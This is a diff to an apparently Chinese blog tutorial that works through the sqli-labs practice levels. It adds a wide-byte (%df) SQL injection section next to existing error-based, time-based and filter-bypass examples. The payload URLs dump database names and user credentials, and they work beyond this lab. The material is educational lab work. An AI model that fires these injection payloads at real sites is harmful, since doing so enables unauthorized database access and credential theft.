@@ -921,6 +921,17 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*),floor(rand(0)*2) x from information_schema.tables group by concat(&#39;~&#39;,(select concat(username,&#39;:&#39;,password) from users limit 0,1),&#39;~&#39;,x)--+</span><br></pre></td></tr></table></figure>
 <p>成功爆出用户名和密码,同样利用limit爆出其他数据</p>
 <p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210729090717689.png" alt=""></p>
+<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a><a href="https://www.freebuf.com/articles/network/282252.html">宽字节注入</a></h4><p>测试地址:<a href="https://sqli.wmcoder.site/sqli-labs/Less-32/">https://sqli.wmcoder.site/sqli-labs/Less-32/</a></p>
+<p>当输入?id=1’时</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-32&#x2F;?id&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
+<p>可见1与’之间多了个\,导致单引号被转义</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210802210400963.png" alt=""></p>
+<p>想办法使\成为单引号中的内容(一般使用%df)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-32&#x2F;?id&#x3D;1%df&#39; --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210802211231477.png" alt=""></p>
+<p>接下来可以使用union注入或者报错注入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-32&#x2F;?id&#x3D;-1%df&#39; union select 1,2,database() --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210802211334180.png" alt=""></p>
 <h3 id="SQL注入进阶"><a href="#SQL注入进阶" class="headerlink" title="SQL注入进阶"></a>SQL注入进阶</h3><h4 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h4><p>时间注入测试地址:<a href="https://sqli.wmcoder.site/sqli-labs/Less-9/">https://sqli.wmcoder.site/sqli-labs/Less-9/</a></p>
 <p>时间注入也叫时间盲注,与Boolean盲注不同的是利用sleep()或benchmark()让mysql的执行时间变长,多与if(exp,v1,v2):如果表达式exp成立,返回结果v1;否则,返回结果v2.</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BENCHMARK(count,expr)</span><br></pre></td></tr></table></figure>
@@ -1161,7 +1172,7 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-26&#x2F;?id&#x3D;1&#39;  || extractvalue(1,concat(&#39;:&#39;,(select(version())))) ||&#39;</span><br></pre></td></tr></table></figure>
 <p>成功绕过</p>
 <p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210802093251555.png" alt=""></p>
-<h4 id="绕过内联注释过滤"><a href="#绕过内联注释过滤" class="headerlink" title="绕过内联注释过滤"></a>绕过内联注释过滤</h4><h4 id="绕过函数过滤"><a href="#绕过函数过滤" class="headerlink" title="绕过函数过滤"></a>绕过函数过滤</h4>]]></content>
+<h4 id="绕过函数过滤"><a href="#绕过函数过滤" class="headerlink" title="绕过函数过滤"></a>绕过函数过滤</h4>]]></content>
       <categories>
         <category>Hack</category>
       </categories>
